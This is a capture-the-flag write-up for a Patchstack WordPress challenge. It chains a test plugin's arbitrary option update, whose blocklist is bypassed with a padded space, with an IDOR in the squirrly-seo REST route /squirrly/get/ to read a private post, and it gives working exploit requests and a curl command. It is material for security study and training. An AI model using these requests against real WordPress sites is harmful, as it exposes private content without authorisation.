# Up To You

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 3 solves / 980 points
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

it's all up to you.

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224232627.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Sneaky/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Up-To-You)-[2025.02.24|23:27:02(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Up-To-You)-[2025.02.24|23:27:03(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
  inflating: server-given/.DS_Store  
   creating: server-given/docker/
   creating: server-given/docker/wordpress/
   creating: server-given/docker/wordpress/toolbox/
  inflating: server-given/docker/wordpress/toolbox/Makefile  
   creating: server-given/docker/wordpress/toolbox/plugins/
   creating: server-given/docker/wordpress/toolbox/plugins/test-plugin/
  inflating: server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php  
  inflating: server-given/docker/wordpress/toolbox/Dockerfile  
 extracting: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the other challenges, we should first take a look at the `docker/wordpress/toolbox/Makefile` file:

```bash
[...]
$(WP_CLI) plugin activate test-plugin
$(WP_CLI) plugin install squirrly-seo --activate
$(WP_CLI) plugin install slim-seo --activate
$(WP_CLI) post create --post_type='post' --post_title='uptoyou' --post_content='$(FLAG_FLAG)' --post_status='private'
```

In here, the WordPress site is installed with plugins called `test-plugin`, `squirrly-seo`, and `slim-seo`. It also created a private post with the flag in its content.

Now, let's setup our own WordPress site and install those plugins!

In plugin `test-plugin`, it has this simple unauthenticated AJAX action called `uptoyou` with callback function `uptoyou`:

```php
add_action("wp_ajax_nopriv_uptoyou", "uptoyou");

function uptoyou(){
    $option_name = $_POST["option_name"];
    $nope = array('users_can_register', 'auto_update_core_minor', 'auto_update_core_dev', 'upload_url_path', 'mailserver_pass', 'wp_user_roles', 'template', 'blog_public', 'html_type', 'sticky_posts', 'use_balanceTags', 'page_for_posts', 'permanent-links', 'hack_file', 'multisite', 'comment_max_links', 'mailserver_login', 'use_trackback', 'comments_per_page', 'default_pingback_flag', 'siteurl', 'enable_app', 'large_size_w', 'default_comments_page', 'default_comment_status', 'links', 'moderation_keys', 'sidebars_widgets', 'posts_per_page', 'links_updated_date_format', 'default_role', 'theme', 'advanced_edit', 'image_default_link_type', 'blogname', 'thumbnail_size_w', 'admin_email', 'enable_xmlrpc', 'rss_use_excerpt', 'require_name_email', 'comment_whitelist', 'medium_large_size_h', 'show_comments_cookies_opt_in', 'comment_order', 'use_balancetags', 'close_comments_for_old_posts', 'gzipcompression', 'use_smilies', 'upload_path', 'moderation_notify', 'close_comments_days_old', 'medium_size_w', 'show_on_front', 'reading', 'show_avatars', 'default_post_format', 'site_icon', 'comments_notify', 'adminhash', 'gmt_offset', 'rewrite_rules', 'rss_language', 'thread_comments_depth', 'permalink_structure', 'default_category', 'links_recently_updated_append', 'thread_comments', 'home', 'widget_categories', 'use_linksupdate', 'default_post_edit_rows', 'comment_moderation', 'start_of_week', 'wp_page_for_privacy_policy', 'date_format', 'widget_text', 'active_plugins', 'avatar_default', 'timezone_string', 'auto_update_core_major', 'default_ping_status', 'tag_base', 'media', 'widget_rss', 'general', 'time_format', 'large_size_h', 'others', 'embed_size_w', 'posts_per_rss', 'image_default_size', 'mailserver_url', 'fileupload_maxk', 'page_comments', 'links_recently_updated_time', 'thumbnail_size_h', 'page_on_front', 'uploads_use_yearmonth_folders', 'ping_sites', 'comment_registration', 'thumbnail_crop', 'medium_large_size_w', 'recently_edited', 'image_default_align', 'avatar_rating', 'links_recently_updated_prepend', 'new_admin_email', 'comments', 'embed_size_h', 'default_email_category', 'embed_autourls', 'stylesheet', 'blacklist_keys', 'https_detection_errors', 'medium_size_h', 'category_base', 'blogdescription', 'avatars', 'mailserver_port', 'default_link_category', 'secret', 'writing', 'blog_charset');

    if(!in_array($option_name, $nope)){
        update_option($option_name, wp_json_encode($_POST["option_value"]));
    }

    echo "option updated";
}
```

In this callback function, we have an arbitrary option update. However, there are some caveats.

First off, there is a list of blacklisted option names that we can't update. Fortunately, if we read the code of `update_option`, we can see that if `$option` is a scalar type (Either type [int](https://www.php.net/manual/en/language.types.integer.php), [float](https://www.php.net/manual/en/language.types.float.php), [string](https://www.php.net/manual/en/language.types.string.php) or [bool](https://www.php.net/manual/en/language.types.boolean.php)), it'll remove space characters from the beginning and end of our option name via PHP function [`trim`](https://www.php.net/manual/en/function.trim.php):

```php
function update_option( $option, $value, $autoload = null ) {
    [...]
    if ( is_scalar( $option ) ) {
        $option = trim( $option );
    }
    [...]
}
```

Therefore, the blacklisted option names can be bypassed via a space character at the beginning or the end of our option name.

With that said, we should be able to update any options with any value? Well no, the value is a JSON string:

```php
function uptoyou(){
    [...]
    update_option($option_name, wp_json_encode($_POST["option_value"]));
    [...]
}
```

So, we need to find options that allow JSON data in their value. To do so, we can setup our local WordPress site, and go to our MySQL database Docker container:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Up-To-You)-[2025.02.25|10:53:08(HKT)]
└> docker container ls 
CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                   [...]
696f4ad945a6   mysql:8.0.20                        "docker-entrypoint.s…"   15 minutes ago   Up 15 minutes   0.0.0.0:3306->3306/tcp, [::]:3306->3306/tcp, 33060/tcp                                     mysql-wpd            
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Up-To-You)-[2025.02.25|10:53:12(HKT)]
└> docker exec -it 696f4ad945a6 /bin/bash                                               
root@696f4ad945a6:/# 
```

And search for options that have the value of a valid JSON syntax, such as a JSON object (`{"key":"value"}`):

```shell
root@696f4ad945a6:/# mysql -umydbuser -pmydbpassword -Dmydbname
[...]
mysql> SELECT * FROM wp_options WHERE option_value LIKE '{"%';
[...]
+-----------+-------------+---------------------------------------------------------------+----------+
| option_id | option_name | option_value                                                  | autoload |
+-----------+-------------+---------------------------------------------------------------+----------+
|       161 | sq_options  | {"sq_version":"12.4.04","sq_api":"",[...],"sq_message":false} | auto     |
+-----------+-------------+---------------------------------------------------------------+----------+
```

Oh! Looks like option `sq_options` is using JSON data for its value!

If we search for this option name in our code editor, we can see that plugin `squirrly-seo` uses this option:

`wp-content/plugins/squirrly-seo/config/config.php`:

```php
/* Define the record name in the Option and UserMeta tables */
defined( 'SQ_OPTION' ) || define( 'SQ_OPTION', 'sq_options' );
```

Hmm... I wonder how does this constant `SQ_OPTION` and option `sq_options` is being used.

Again, by searching for constant `SQ_OPTION`, we can see that class `SQ_Classes_Helpers_DevKit` method `getOptions` uses that constant. As the method name suggested, it fetches option `sq_options` and parse the JSON value into an associative array:

```php
class SQ_Classes_Helpers_DevKit {
    [...]
    public static function getOptions() {
        if ( is_multisite() ) {
            self::$options = json_decode( get_blog_option( get_main_site_id(), SQ_OPTION ), true );
        } else {
            self::$options = json_decode( get_option( SQ_OPTION ), true );
        }

        return self::$options;
    }
}
```

Also, there's an exact same method name in class `SQ_Classes_Helpers_Tools` that does the exact same thing:

```php
class SQ_Classes_Helpers_Tools
{
    [...]
    public static function getOptions($action = '')
    {
        [...]
        $options = json_decode(get_option(SQ_OPTION), true);
        [...]
        return $options;
    }
}
```

Similarly in both classes, they also have an exact same method called `getOption`, such as the following in class `SQ_Classes_Helpers_Tools`:

```php
class SQ_Classes_Helpers_Tools
{
    [...]
    public static function getOption($key)
    {
        if (!isset(self::$options[$key])) {
            self::$options = self::getOptions();

            if (!isset(self::$options[$key])) {
                self::$options[$key] = false;
            }
        }

        return apply_filters('sq_option_' . $key, self::$options[$key]);
    }
}
```

In here, it gets the parsed JSON option `sq_options`'s key by the provided key name.

Now, with that in mind, we can try to find all the registered AJAX actions and REST API routes, preferably unauthenticated.

If we recall, the challenge's WordPress site has a private post with a flag in it:

```bash
[...]
$(WP_CLI) post create --post_type='post' --post_title='uptoyou' --post_content='$(FLAG_FLAG)' --post_status='private'
```

So maybe we need to find an **unauthenticated AJAX action or REST API route that read private posts**?

If we search for WordPress function that register REST API routes, `register_rest_route`, we can see there are 4 unauthenticated REST API routes registered via class `SQ_Controllers_Api` method `sqApiInit`:

```php
class SQ_Controllers_Api extends SQ_Classes_FrontController {
    [...]
    private $namespace = 'squirrly';
    [...]
    function sqApiInit() {
        if ( function_exists( 'register_rest_route' ) ) {

            register_rest_route( $this->namespace, '/indexnow/', array(
                    'methods'             => WP_REST_Server::EDITABLE,
                    'callback'            => array( $this, 'indexUrl' ),
                    'permission_callback' => '__return_true'
                ) );

            register_rest_route( $this->namespace, '/save/', array(
                    'methods'             => WP_REST_Server::EDITABLE,
                    'callback'            => array( $this, 'savePost' ),
                    'permission_callback' => '__return_true'
                ) );

            register_rest_route( $this->namespace, '/get/', array(
                    'methods'             => WP_REST_Server::READABLE,
                    'callback'            => array( $this, 'getData' ),
                    'permission_callback' => '__return_true'
                ) );

            register_rest_route( $this->namespace, '/test/', array(
                    'methods'             => WP_REST_Server::EDITABLE,
                    'callback'            => array( $this, 'testConnection' ),
                    'permission_callback' => '__return_true'
                ) );
                [...]
            }
        }
    }
}
```

In REST API route `/squirrly/get/` with GET method, it has a callback method `getData`. In this callback method, we can read any posts we want:

```php
class SQ_Controllers_Api extends SQ_Classes_FrontController {
    [...]
    public function getData( WP_REST_Request $request ) {
        [...]
        $select = $request->get_param( 'select' );

        switch ( $select ) {
            case 'post':
                $id = (int) $request->get_param( 'id' );
                [...]
                //get Squirrly SEO post metas
                if ( $post = SQ_Classes_ObjController::getClass( 'SQ_Models_Snippet' )->setPostByID( $id ) ) {
                    $response = $post->toArray();
                }
    
                break;
        }
        echo wp_json_encode( $response );
        [...]
    }
}
```

This is because the callback method and method `setPostByID` in class `SQ_Models_Snippet` didn't validate the post's status is private or draft, is password protected, and more. Therefore, this callback method is vulnerable to IDOR (Insecure Direct Object Reference):

```php
class SQ_Models_Snippet {
    [...]
    public function setPostByID( $post = 0 ) {

        if ( ! $post instanceof WP_Post && ! $post instanceof SQ_Models_Domain_Post ) {
            $post_id = (int) $post;
            if ( $post_id > 0 ) {
                $post = get_post( $post_id );
            }
        }

        if ( $post ) {
            if ( isset( $post->post_type ) ) {
                set_query_var( 'post_type', $post->post_type );
            }
            $post = SQ_Classes_ObjController::getClass( 'SQ_Models_Frontend' )->setPost( $post )->getPost();

            return $post;
        }

        return false;
    }
}
```

However, before we can get the post, it also checks the API token:

```php
class SQ_Controllers_Api extends SQ_Classes_FrontController {
    [...]
    public function getData( WP_REST_Request $request ) {
        [...]
        //get the token from API
        $token = $request->get_param( 'token' );
        if ( $token <> '' ) {
            $token = sanitize_text_field( $token );
        }

        if ( ! $this->token || $this->token <> $token ) {
            exit( wp_json_encode( array( 'error' => esc_html__( "Connection expired. Please try again.", 'squirrly-seo' ) ) ) );
        }
        [...]
    }
}
```

Luckily, this token check can be bypassed.

But before we exploit this vulnerability, we should figure out how this REST API route is registered. Since this route is registered via method `sqApiInit`, we need to know how this method is being called. Turns out, this method is called via `rest_api_init` hook, which is called via `hookInit`:

```php
class SQ_Controllers_Api extends SQ_Classes_FrontController {
    [...]
    public function hookInit() {

        if ( SQ_Classes_Helpers_Tools::getOption( 'sq_api' ) == '' ) {
            return;
        }

        if ( ! SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_connect' ) ) {
            return;
        }

        $this->token = SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_token' );

        //Change the rest api if needed
        add_action( 'rest_api_init', array( $this, 'sqApiInit' ) );
    }
}
```

Before it calls callback method `sqApiInit`, it has 2 checks, which checks the option's array key `sq_api` and `sq_cloud_connect` must not be falsy (Loose comparison). Also, remember the API token? In here, it sets the `token` attribute to the option's array key `sq_cloud_token`'s value.

Luckily, we can leverage the arbitrary option update in `test-plugin` to pass those checks.

## Exploitation

Armed with above information, we can get the flag via the following requests:

First, update option `sq_options`'s JSON attribute `sq_api` and `sq_cloud_connect` to be an non-fasly value, and update `sq_cloud_token` to any string via arbitrary option update in `test-plugin`'s AJAX action `uptoyou`:

```http
POST / HTTP/1.1
Host: 52.77.81.199:9177
Content-Type: application/x-www-form-urlencoded
Content-Length: 135

action=uptoyou&option_name=sq_options&option_value[sq_api]=anything&option_value[sq_cloud_connect]=1&option_value[sq_cloud_token]=token
```

Then, we can get the private flag post via REST route `/squirrly/get/`. Note that the `token` parameter's value must match to the updated one. In my case, the API token is string `token`:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Up-To-You/server-given/docker/wordpress/toolbox/plugins)-[2025.02.26|20:52:14(HKT)]
└> curl -s --get http://52.77.81.199:9177/ --data 'rest_route=/squirrly/get/&token=token&select=post&id=5' | jq -r '.["post_content"]' | tr -d '"'
CTF{up_to_you_how_to_get_the_flag_7cdd34392012dd}
```

- **Flag: `CTF{up_to_you_how_to_get_the_flag_7cdd34392012dd}`**

## Conclusion

What we've learned:

1. Read arbitrary posts via chaining with arbitrary option update and IDOR